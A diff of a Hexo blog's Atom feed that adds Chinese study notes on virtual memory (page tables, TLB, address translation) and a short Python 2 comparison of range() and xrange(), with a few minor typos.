@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-06-18T07:54:10.152Z</updated>
+  <updated>2018-06-21T14:13:50.103Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -16,11 +16,280 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>深入理解计算机系统|虚拟存储器</title>
+    <link href="http://yoursite.com/2018/06/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E8%99%9A%E6%8B%9F%E5%AD%98%E5%82%A8%E5%99%A8/"/>
+    <id>http://yoursite.com/2018/06/22/深入理解计算机系统-虚拟存储器/</id>
+    <published>2018-06-21T19:46:49.000Z</published>
+    <updated>2018-06-21T14:13:50.103Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>你是否疑惑过为什么两个进程可以拥有同一个地址，明明某个地址处的物理内存只有一块啊。这其实是系统提供的一种对主存的一种抽象，叫做虚拟存储器。它为每个进程提供了一个大的、一致的、和私有的地址空间。虚拟存储器提供了三个重要的能力：</p>
+<ol>
+<li>将主存作为一个存储在磁盘上的地址空间的缓存。</li>
+<li>为每个进程提供一致的地址空间。</li>
+<li>保护每个进程的地址空间不被其他进程破坏。</li>
+</ol>
+<h3 id="物理和虚拟寻址"><a href="#物理和虚拟寻址" class="headerlink" title="物理和虚拟寻址"></a>物理和虚拟寻址</h3><p>计算机系统的主存被组织成一个有M个连续的字节大小的单元组成的数组。每字节都有一个唯一的物理地址(physical address)。在这种简单的结构中，CPU要访问存储器，最简单的方式就是使用存储器的物理地址，也成为<strong>物理寻址</strong>。</p>
+<p><img src="/images/虚拟存储器-02.png" alt=""></p>
+<p>当然还有另一种寻址方式，<strong>虚拟寻址</strong>。CPU生成一个虚拟地址来访问主存，这个虚拟地址经过地址翻译生成适当的物理地址。将一个虚拟地址转换为物理地址的任务叫做地址翻译。就像异常处理一样，地址翻译需要CPU硬件和操作系统之间的紧密合作。CPU芯片上叫做存储器管理单元(Memory Management Unit，MMU)的专用硬件，利用存放在主存中的查询表来动态翻译虚拟地址，该表的内容是由操作系统管理。</p>
+<p><img src="/images/虚拟存储器-01.png" alt=""></p>
+<h3 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h3><p>地址空间(adress space)是一个非整数地址的有序集合：{0,1,2,…}。</p>
+<p>如果地址空间中的整数是连续的，那么我们说它是一个线性地址空间(linear address space)。在一个带虚拟存储器的系统中，CPU从一个有N = 2 ^ n个地址空间中生成虚拟地址，这个地址空间称为<strong>虚拟地址空间(virtual address space)</strong>：{0,1,2,3,…,N-1}。</p>
+<p>一个地址空间的大小是由表示最大地址所需要的倍数来描述的。例如，一个包含N=2^n个地址的虚拟地址空间叫做一个n位地址空间。现在系统典型地支持32位或者64位虚拟地址空间。</p>
+<p>一个系统还有一个<strong>物理地址空间(physical addresss space)</strong>，它与系统中物理存储器的M字节相对应：{0,1,2,…M-1}。</p>
+<p>地址空间的概念是很重要的，因为它清楚地区分了<strong>数据对象(字节)</strong>和它们的<strong>属性(地址)</strong>。一旦认识到了这种区别，那么我们就可以将其推广，<strong>允许每个数据对象有多个独立的地址，其中每个地址都选自一个不同的地址空间</strong>。这就是虚拟存储器的基本思想。主存中每个字节都有一个选自虚拟地址空间的虚拟地址和一个选自物理地址空间的物理地址。</p>
+<h3 id="内存是磁盘的Cache"><a href="#内存是磁盘的Cache" class="headerlink" title="内存是磁盘的Cache"></a>内存是磁盘的Cache</h3><p>概念上而言，虚拟存储器被组织为一个由存放在磁盘上的N个连续的字节大小的单元组成的数组。每个字节都有一个唯一的虚拟地址，这个唯一的虚拟地址是作为到数组的索引的。磁盘上的数组的内容被缓存在主存中。和存储器层次结构中其他缓存一样，磁盘(较低层)上的数据被分割成块，这些块作为磁盘和主存(较高层)之间的传输单元。VM系统通过将虚拟存储器分割称为<strong>虚拟页(Vitual Page，VP)</strong>的大小固定的块来处理这个问题。每个虚拟页的大小为P = 2 ^ n字节。类似地，物理存储器被分割为<strong>物理页(Physical Page，PP)</strong>，大小也为P字节(物理页也称为<strong>页帧(page frame))</strong>。</p>
+<p>在任意时刻，虚拟页面的集合都分为三个不相交的子集：</p>
+<ul>
+<li>未分配的：VM系统还未分配(或者创建)的页。未分配的块没有任何数据和它们相关联，因此也就不占用任何磁盘空间。(没有调用malloc或者mmap的)</li>
+<li>缓存的：当前缓存在物理存储中的已分配页。(已经调用malloc和mmap的，在程序中正在引用的)</li>
+<li>未缓存的：没有缓存在物理存储器中的已分配页。(已经调用malloc和mmap的，在程序中还没有被引用的)</li>
+</ul>
+<p><img src="/images/虚拟存储器-03.png" alt=""></p>
+<p>上图中，虚拟页0和3还没有被分配，因此在磁盘上还不存在。虚拟页1、4和6被缓存在物理存储器中。页2、5和7已经被分配了，但是当前并未缓存在主存中，只存在于磁盘中。</p>
+<h4 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h4><p>同任何缓存一样，虚拟存储器系统必须有某种方法来判定一个虚拟页是否存放在DRAM中的某个地方。如果是，系统还必须确定这个虚拟页存放在哪个物理页中。如果不命中，系统必须判断这个虚拟页存放在磁盘的哪个位置，在物理存储器中选择一个牺牲页，并将虚拟页从磁盘拷贝到DRAM中，替换这个牺牲页。</p>
+<p>这些功能是由许多软硬件联合提供的，包括操作系统软件，MMU(存储器管理单元)中地址翻译硬件和一个存放在物理存储器中叫做<strong>页表(page table)</strong>的数据结构，页表将虚拟页映射到物理页。<strong>页表就是一个页表条目(Page Table Entry，PTE)的数组。</strong>为了简化，设PTE由一个有效位和一个n位地址字段组成。设置了有效位表明虚拟页为已缓存的，地址指向DRAM中相应物理页的起始位置；未设置有效位且地址为空表明虚拟页未分配，否则地址指向磁盘上虚拟页的起始位置。</p>
+<p><img src="/images/虚拟存储器-04.png" alt=""></p>
+<p>当CPU读取的字在某一虚拟页，且该页已缓存，则称为<strong>页命中</strong>。DRAM缓存不命中称为<strong>缺页</strong>，它触发一个缺页异常。缺页异常调用内核中的缺页异常处理程序，该程序选择一个牺牲页，如果该页已经被修改，内核将它写回磁盘，然后内核更新页并返回，异常处理程序返回时会重新启动导致缺页的指令。</p>
+<p>在磁盘和存储器之间传送页称为<strong>交换或页面调度</strong>。现代系统采用<strong>按需页面</strong>调度的策略，即当有不命中发生时才换入页面。</p>
+<p>局部性原理使程序引用的页面趋向于在一个较小的活动页面集合上工作，该集合称为工作集（常驻集合）。通常虚拟存储器系统工作得很好，但如果工作集的大小超出了物理存储器的大小，那么程序会产生颠簸，即页面不断换进换出。</p>
+<p>操作系统为每个进程都提供了一个独立的页表，即一个独立的虚拟地址空间。多个虚拟页面可以映射到同一个共享物理页面上。这带来了很多好处：</p>
+<ul>
+<li><p>简化链接。独立的地址空间使进程可以为它的存储器映像使用相同的基本格式，而不管代码和数据在物理存储器的实际存放位置。Linux进程的存储器映像可以见前面章节。文本区、栈、共享库、操作系统代码和数据总是从固定的位置开始。</p>
+</li>
+<li><p>简化共享。独立的地址空间提供了一个管理用户进程和操作系统自身之间共享的一致机制。操作系统将不同进程中的一些虚拟页映射到相同的物理页来使它们共享这部分代码。</p>
+</li>
+<li><p>简化存储器分配。虚拟存储器是一个向用户进程分配额外存储器的机制。页面可以随机地分散在物理存储器中。</p>
+</li>
+<li><p>简化加载。虚拟存储器简化了加载可执行文件和已共享目标文件，只需将虚拟页标识为无效的（未缓存）并将PTE指向目标文件的适当位置。实际中加载器并不从磁盘复制数据到存储器，而是在页面被引用时再按需调度。</p>
+</li>
+</ul>
+<p><img src="/images/虚拟存储器-05.png" alt=""></p>
+<p>虚拟存储器也可以提供对存储器的访问保护，可以通过在PTE上添加一些额外的许可位来控制对一个虚拟页面内容的访问。指令违反许可条件时，CPU触发一个一般保护故障的异常，Linux将它报告为段错误。</p>
+<h5 id="页命中"><a href="#页命中" class="headerlink" title="页命中"></a>页命中</h5><p>如下图，当CPU读包含在VP2中的虚拟存储器的一个字时，会怎么样呢？从图中，我们知道VP2是被缓存在DRAM中的。地址翻译硬件将虚拟地址作为一个索引来定位<code>PTE2</code>，并从存储器中读取PTE2的的内容。因为设置了有效位，那么地址翻译硬件就知道VP2是缓存在存储器中的了，所以使用PTE2的内容来构造物理地址。</p>
+<p><img src="/images/虚拟存储器-06.png" alt=""></p>
+<h5 id="缺页"><a href="#缺页" class="headerlink" title="缺页"></a>缺页</h5><p>还是刚刚的图，如果CPU访问VP3，我们知道VP3的内容不再DRAM中，那么会发生什么呢？这时会触发一个<strong>缺页异常</strong>。缺页异常调用内核中的缺页异常处理程序，该程序会选择一个牺牲页，如下图，选择了PP3中的VP4。</p>
+<p><img src="/images/虚拟存储器-07.png" alt=""></p>
+<p>如果VP4已经被修改了，那么内核就会将它拷贝回磁盘。无论哪种情况，内核都会修改VP4的页表条目（如上图），反映出VP4已经被换出，不在缓存在内存中的事实。接下来，内核从磁盘拷贝VP3到主存中的PP3，更新VP3的页表条目，然后返回，重启导致缺页的指令。此时，VP3已经在内存中，就会发生页命中。</p>
+<h5 id="页分配"><a href="#页分配" class="headerlink" title="页分配"></a>页分配</h5><p>下图展示了操作系统分配一个新的虚拟存储页后对我们页表的影响。例如，当我们调用alloc时，在磁盘上创建空间并更新页表的VP5，让它指向磁盘上一个新的页面。同时，我们也能发现，刚分配的空间，并没有立即在内存中分配空间，只是在页表里添加了一个磁盘的映射。</p>
+<p><img src="/images/虚拟存储器-08.png" alt=""></p>
+<h3 id="地址翻译"><a href="#地址翻译" class="headerlink" title="地址翻译"></a>地址翻译</h3><p>地址翻译是N元素虚拟地址空间（VAS）的元素和M元素物理地址空间（PAS）的元素之间的映射 <code>MAP:VAS-&gt; PAS U Φ</code>。</p>
+<ul>
+<li>MAP(A) = A’，若虚拟地址A处的数据在物理地址A’处。</li>
+<li>MAP(A) = Φ，若虚拟地址A处的数据不在物理存储器中。</li>
+</ul>
+<p><img src="/images/虚拟存储器-09.png" alt=""></p>
+<p>CPU中的<code>页表基址寄存器（PTBR）</code>指向当前页表。n位的虚拟地址包含p位的<code>VPO（虚拟页面偏移</code>）和<code>n-p位的VPN（虚拟页号）</code>两部分，MMU利用<code>VPN</code>选择<code>PTE</code>，将PTE中的<code>PPN（物理页号</code>）和虚拟地址中的<code>VPO</code>串联，得到相应的物理地址。<code>PPO（物理页面偏移）</code>和<code>VPO</code>是相同的。</p>
+<h4 id="页命中-1"><a href="#页命中-1" class="headerlink" title="页命中"></a>页命中</h4><p>下图展示了当页命中时，CPU硬件执行的步骤：</p>
+<ol>
+<li>CPU生成虚拟地址，传送给MMU。</li>
+<li>MMU生成PTE地址，向高速缓存/主存请求它。</li>
+<li>高速缓存/主存向MMU返回PTE。</li>
+<li>MMU构造物理地址，传送给高速缓存/主存。</li>
+<li>高速缓存/主存返回所请求的数据。</li>
+</ol>
+<p><img src="/images/虚拟存储器-10.png" alt=""></p>
+<h4 id="缺页-1"><a href="#缺页-1" class="headerlink" title="缺页"></a>缺页</h4><p><img src="/images/虚拟存储器-11.png" alt=""></p>
+<p>缺页时，硬件和系统内核协作：</p>
+<ol>
+<li>和页面命中时前三步相同。</li>
+<li>PTE有效位为0，MMU触发异常，传递CPU中的控制到操作系统内核中的缺页异常处理程序。 </li>
+<li>缺页处理程序确定物理存储器中的牺牲页，若该页已被修改，把它页面换出到磁盘。 </li>
+<li>缺页处理程序调入新的页面，更新存储器中的PTE。 </li>
+<li>缺页处理程序返回到原来的进程，重新启动导致缺页的指令。重新发送给MMU，页面命中。</li>
+</ol>
+<h4 id="cache和虚拟存储器的结合"><a href="#cache和虚拟存储器的结合" class="headerlink" title="cache和虚拟存储器的结合"></a>cache和虚拟存储器的结合</h4><p>现在我们将虚拟存储器和之前学过的cache结合起来。高速缓存通常是物理寻址的，地址翻译发生在高速缓存查找之前。所以一次访问的过程如下图：</p>
+<p><img src="/images/虚拟存储器-12.png" alt=""></p>
+<h4 id="利用TLB加速地址翻译"><a href="#利用TLB加速地址翻译" class="headerlink" title="利用TLB加速地址翻译"></a>利用TLB加速地址翻译</h4><p>为消除查找PTE的开销，在MMU中包含一个PTE的小缓存，称为<strong>TLB（翻译后备缓冲器）</strong>，它是一个小的虚拟寻址的缓存，每行保存一个单个PTE组成的块。TLB有高度的相联性。</p>
+<p>若TLB有T = 2^t个组，TLB索引（TLBI）由VPN的t个最低位组成，TLB标记（TLBT）由VPN的剩余的位组成。如下图：</p>
+<p><img src="/images/虚拟存储器-13.png" alt=""></p>
+<h5 id="TLB命中"><a href="#TLB命中" class="headerlink" title="TLB命中"></a>TLB命中</h5><p>下图展示了TLB命中时的访问步骤：</p>
+<ol>
+<li>CPU生成虚拟地址，传送给MMU。</li>
+<li>MMU从TLB取出相应的PTE</li>
+<li>MMU构造物理地址，传送给高速缓存/主存。</li>
+<li>高速缓存/主存返回所请求的数据。</li>
+</ol>
+<p><img src="/images/虚拟存储器-14.png" alt=""></p>
+<h5 id="TLB不命中"><a href="#TLB不命中" class="headerlink" title="TLB不命中"></a>TLB不命中</h5><p>当TLB不命中时，MMU需要从L1cache中取出相应的PTE（如下图），新取出的PTE存放在TLB中，可能会覆盖一个已经存在的条目。</p>
+<p><img src="/images/虚拟存储器-15.png" alt=""></p>
+<h4 id="多级页表"><a href="#多级页表" class="headerlink" title="多级页表"></a>多级页表</h4><p>对于32位地址空间、4KB的页面，若PTE为4字节，则页表会达到4MB，64位的地址空间的页表就更加庞大。实际中的系统使用多级页表来压缩页表。这样只有一级页表才需要总在主存中。</p>
+<p>k级页表的地址翻译中，虚拟地址被划分为k个VPN和1个VPO。第k级页表中的PTE指向物理页面的PPN。</p>
+<p><img src="/images/虚拟存储器-17.png" alt=""></p>
+<p>多级页表下的TLB地址组成：</p>
+<p><img src="/images/虚拟存储器-16.png" alt=""></p>
+<p>讲述到这里，虚拟存储器的内容几乎讲完啦，下面我们用一个图来总结这一切：</p>
+<p><img src="/images/虚拟存储器-18.png" alt=""></p>
+<h3 id="一些商业系统示例"><a href="#一些商业系统示例" class="headerlink" title="一些商业系统示例"></a>一些商业系统示例</h3><p>在Pentium存储器系统中，有32位地址空间、4KB的页大小、TLB、L1、L2为4路组相联：</p>
+<ul>
+<li>指令TLB：32个条目、8组。</li>
+<li>数据TLB：64个条目、16组。</li>
+<li>L1 i-cache和d-cache：16KB、128组、32B块大小。</li>
+<li>L2高速缓存：128KB ~ 2MB、32B块大小。</li>
+</ul>
+<p>Pentium系统使用两级页表，第一级页表称为页面目录，包含1024个32位的PDE（页面目录条目），PDE指向二级页表，每个二级页表包含1024个32位的PTE，PTE指向物理存储器或磁盘上的页面。每个进程有唯一的页面目录和页表集合，页表可以换进换出，页表目录和已分配页面的相关页表常驻存储器。PDBR（页面目录基址寄存器）指向页表目录的起始位置。</p>
+<p><img src="/images/虚拟存储器-19.png" alt=""></p>
+<p>在Linux系统中，虚拟存储器中位于 0xc0000000 之上的部分为内核虚拟存储器，它包含内核的代码和数据，部分区域映射到所有进程共享的物理页面，其他区域包含每个进程不同的数据。同时，虚拟存储器被组织成区域（段）的集合，区域是已分配的连续组块，以某种方式相关联。不属于某区域的虚拟页是不存在的，不能被引用。区域允许了虚拟地址空间有间隙。</p>
+<p><img src="/images/虚拟存储器-20.png" alt=""></p>
+<p>内核为每个进程维护一个任务结构 task_struct ，结构中包含运行进程所需的信息。其中一个条目指向 mm_struct ，它描述了虚拟存储器的当前状态。其中两个字段， pgd 指向页面目录表的基址， mmap 指向 vm_area_struct 链表。每个 vm_area_struct 描述当前虚拟地址空间的一个区域。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/** &lt;linux/mm_types.h&gt; */</span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> &#123;</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_start;         <span class="comment">/* 区域开始处 */</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_end;           <span class="comment">/* 区域结束处 */</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vm_next</span>;</span> <span class="comment">/* 链表中下一个区域结构 */</span></div><div class="line">    <span class="keyword">pgprot_t</span> vm_page_prot;          <span class="comment">/* 区域内所有页面的读写权限 */</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_flags;         <span class="comment">/* 区域内的页面是共享的还是私有的, ... */</span></div><div class="line">    <span class="comment">/* ... */</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+<h3 id="地址翻译示例"><a href="#地址翻译示例" class="headerlink" title="地址翻译示例"></a>地址翻译示例</h3><p>下面，我们来完成一个端到端的地址翻译示例，来综合刚刚讲的内容。</p>
+<p>首先，我们做出如下假设：</p>
+<ul>
+<li>存储器按字节寻址</li>
+<li>存储器访问是针对一字节的字的（不是4字节的字）</li>
+<li>虚拟地址是14位长的 (n=14)</li>
+<li>物理地址是12位长的 (m=12)</li>
+<li>页面大小是64字节的 (P=64)</li>
+<li>TLB是四路组相连的，总共有16个条目</li>
+<li>L1 d-cache是物理寻址、直接映射的，行大小为4字节，总共有16个组</li>
+</ul>
+<p>下面是相应的虚拟地址和物理地址的格式。</p>
+<p><img src="/images/虚拟存储器-21.png" alt=""></p>
+<p>下面是讲解例子要使用的小存储器系统的一个快照，包括TLB、页表的一部分和Cahce。</p>
+<ul>
+<li>TLB地址格式和TLB快照：</li>
+</ul>
+<p><img src="/images/虚拟存储器-22.png" alt=""></p>
+<ul>
+<li>页表的部分快照：</li>
+</ul>
+<p><img src="/images/虚拟存储器-23.png" alt=""></p>
+<ul>
+<li>cahce快照</li>
+</ul>
+<p><img src="/images/虚拟存储器-24.png" alt=""></p>
+<h4 id="第一个例子"><a href="#第一个例子" class="headerlink" title="第一个例子"></a>第一个例子</h4><p>现在，让我们看看当CPU执行一条读地址<code>0x03d4</code>处字节的加载指令会发生什么。</p>
+<p>首先，我们先分析虚拟地址：</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>虚拟地址</td>
+<td>0x03d4</td>
+</tr>
+<tr>
+<td>二进制表示</td>
+<td>00-0011-1101-0100</td>
+</tr>
+<tr>
+<td>VPN</td>
+<td>0000-1111 -&gt; 0x0f</td>
+</tr>
+<tr>
+<td>VPO</td>
+<td>01-0100 -&gt; 0x14</td>
+</tr>
+<tr>
+<td>TLBI</td>
+<td>11 -&gt; 0x03</td>
+</tr>
+<tr>
+<td>TLBT</td>
+<td>000011 -&gt; 0x03</td>
+</tr>
+</tbody>
+</table>
+<p>从虚拟地址中，我们分解出 <code>VPN</code>,然后得到TLB的 <code>TLBI</code>好<code>TLBT</code> ,接着，我们检查TLB，看它是否因为前面的某个存储器引用，缓存了PTE<code>0x0f</code>的一个拷贝。很幸运，我们找到了，如下图：</p>
+<p><img src="/images/虚拟存储器-25.png" alt=""></p>
+<p>我们得到了<code>PPN (0x0D)</code> ,返回给MMU。现在，MMU就有了形成物理地址所需要的所有东西了：将来自PTE的<code>PPN (0x0D)</code>和来自虚拟地址的 <code>VPO(0x14)</code>拼接起来，得到了<strong>物理地址 <code>0x354</code></strong>。</p>
+<p>接下来，我们分析下物理地址：</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>物理地址</td>
+<td>0x345</td>
+</tr>
+<tr>
+<td>二进制表示</td>
+<td>0011-0101-0100</td>
+</tr>
+<tr>
+<td>CO</td>
+<td>0x0</td>
+</tr>
+<tr>
+<td>CI</td>
+<td>0x05</td>
+</tr>
+<tr>
+<td>CT</td>
+<td>0x0d</td>
+</tr>
+<tr>
+<td>PPN</td>
+<td>0x0d</td>
+</tr>
+<tr>
+<td>PPO</td>
+<td>0x14</td>
+</tr>
+</tbody>
+</table>
+<p>幸运女神在一次光临我们，我们在cache中找到了地址<code>0x354</code>的拷贝，如下图：</p>
+<p><img src="/images/虚拟存储器-26.png" alt=""></p>
+<p>所以从cache中读出偏移量CO处的数据字节<code>0x36</code>，并将它返回给MMU，随后MMC返回给CPU。</p>
+<p>当然，我们不可能都这么幸运，每次都能在缓存中找到拷贝。</p>
+<ul>
+<li>如果在TLB中没有缓存，那么MMU就需要从主存的页表中取出相应的PTE。</li>
+<li>如果页表中的PTE是无效的，需要产生一个缺页异常，然后内核调入合适的页面。</li>
+<li>如果cache中没有缓存，需要根据物理地址到主存中取数据。</li>
+</ul>
+<p><a href="http://www.yeolar.com/note/2012/03/29/virtual-memory/" target="_blank" rel="external">Linux系统学习笔记：虚拟存储器</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h3&gt;&lt;p&gt;你是否疑惑过为什么两个进程可以拥有同一个地址，明明某个地址处的物理内存只有一块啊。这其实是系统提供的一种对主存的一种抽象，叫做虚拟存储器。它
+    
+    </summary>
+    
+      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
+    
+    
+      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>python|Multiprocessing多进程</title>
+    <link href="http://yoursite.com/2018/06/21/python-Multiprocessing%E5%A4%9A%E8%BF%9B%E7%A8%8B/"/>
+    <id>http://yoursite.com/2018/06/21/python-Multiprocessing多进程/</id>
+    <published>2018-06-20T23:47:38.000Z</published>
+    <updated>2018-06-20T17:09:07.126Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://thief.one/2016/11/23/Python-multiprocessing/" target="_blank" rel="external">【Multiprocessing系列】Multiprocessing基础</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;a href=&quot;https://thief.one/2016/11/23/Python-multiprocessing/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;【Multiprocessing系列】Multiprocessing基础&lt;/a&gt;&lt;/p
+    
+    </summary>
+    
+      <category term="python" scheme="http://yoursite.com/categories/python/"/>
+    
+    
+      <category term="python" scheme="http://yoursite.com/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
     <title>python|python中的一些妙招</title>
     <link href="http://yoursite.com/2018/06/16/python-python%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A6%99%E6%8B%9B/"/>
     <id>http://yoursite.com/2018/06/16/python-python中的一些妙招/</id>
     <published>2018-06-16T15:58:25.000Z</published>
-    <updated>2018-06-18T07:54:10.152Z</updated>
+    <updated>2018-06-21T07:41:03.838Z</updated>
     
     <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>最近准备入坑python,但又不想从基础的学起，又深知要想掌握一门语言，需要了解其的特性，所以以此文来记录日常发现的一些特性。</p>
 <h3 id="python-中的-1"><a href="#python-中的-1" class="headerlink" title="python 中的[::-1]"></a>python 中的[::-1]</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> value <span class="keyword">in</span> rang(<span class="number">10</span>)涉及的数字倒序输出：</div><div class="line"></div><div class="line">　　<span class="keyword">for</span> value <span class="keyword">in</span> rang(<span class="number">10</span>)[::<span class="number">-1</span>]涉及的数字倒序输出：</div></pre></td></tr></table></figure>
@@ -81,6 +350,15 @@
 <p>for循环其实可以同时使用两个甚至多个变量，比如dict的items()可以同时迭代key和value：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; d = &#123;&apos;x&apos;: &apos;A&apos;, &apos;y&apos;: &apos;B&apos;, &apos;z&apos;: &apos;C&apos; &#125;</div><div class="line">&gt;&gt;&gt; for k, v in d.items():</div><div class="line">...     print(k, &apos;=&apos;, v)</div><div class="line">...</div><div class="line">y = B</div><div class="line">x = A</div><div class="line">z = C</div></pre></td></tr></table></figure></p>
 <p>因此，列表生成式也可以使用两个变量来生成list：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; d = &#123;&apos;x&apos;: &apos;A&apos;, &apos;y&apos;: &apos;B&apos;, &apos;z&apos;: &apos;C&apos; &#125;</div><div class="line">&gt;&gt;&gt; [k + &apos;=&apos; + v for k, v in d.items()]</div><div class="line">[&apos;y=B&apos;, &apos;x=A&apos;, &apos;z=C&apos;]</div></pre></td></tr></table></figure></p>
 <p>最后把一个list中所有的字符串变成小写：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; L = [&apos;Hello&apos;, &apos;World&apos;, &apos;IBM&apos;, &apos;Apple&apos;]</div><div class="line">&gt;&gt;&gt; [s.lower() for s in L]</div><div class="line">[&apos;hello&apos;, &apos;world&apos;, &apos;ibm&apos;, &apos;apple&apos;]</div></pre></td></tr></table></figure></p>
+<h3 id="python-range-xrange-区别"><a href="#python-range-xrange-区别" class="headerlink" title="python  range() xrange() 区别"></a>python  range() xrange() 区别</h3><p><code>range()函数</code>：</p>
+<p>函数说明：<code>range([start,] stop[, step])</code>，根据start与stop指定的范围以及step设定的步长，生成一个序列。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; #一个参数的range()</div><div class="line">...</div><div class="line">&gt;&gt;&gt; range(10)</div><div class="line">[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]</div><div class="line">&gt;&gt;&gt; #两个参数的range()</div><div class="line">...</div><div class="line">&gt;&gt;&gt; range(1,20)</div><div class="line">[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19]</div><div class="line">&gt;&gt;&gt; #带步长的range()函数</div><div class="line">...</div><div class="line">&gt;&gt;&gt; range(1,20,2)</div><div class="line">[1, 3, 5, 7, 9, 11, 13, 15, 17, 19]</div></pre></td></tr></table></figure>
+<p><code>xrange()函数</code><br>函数说明：用法与range完全相同，所不同的是生成的不是一个数组，而是一个生成器。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; xrange(10)</div><div class="line">xrange(10)</div><div class="line">&gt;&gt;&gt; list(xrange(10))</div><div class="line">[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]</div><div class="line">&gt;&gt;&gt; xrange(1,10)</div><div class="line">xrange(1, 10)</div><div class="line">&gt;&gt;&gt; list(xrange(1,10))</div><div class="line">[1, 2, 3, 4, 5, 6, 7, 8, 9]</div><div class="line">&gt;&gt;&gt; xrange(1,20,2)</div><div class="line">xrange(1, 21, 2)</div><div class="line">&gt;&gt;&gt; list(xrange(1,21,2))</div><div class="line">[1, 3, 5, 7, 9, 11, 13, 15, 17, 19]</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; b = range(0,100)</div><div class="line">&gt;&gt;&gt; print type(b)</div><div class="line">&lt;type &apos;list&apos;&gt;</div><div class="line">&gt;&gt;&gt; print b</div><div class="line">[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99]</div><div class="line">&gt;&gt;&gt; print b[0],b[10]</div><div class="line">0 10</div></pre></td></tr></table></figure>
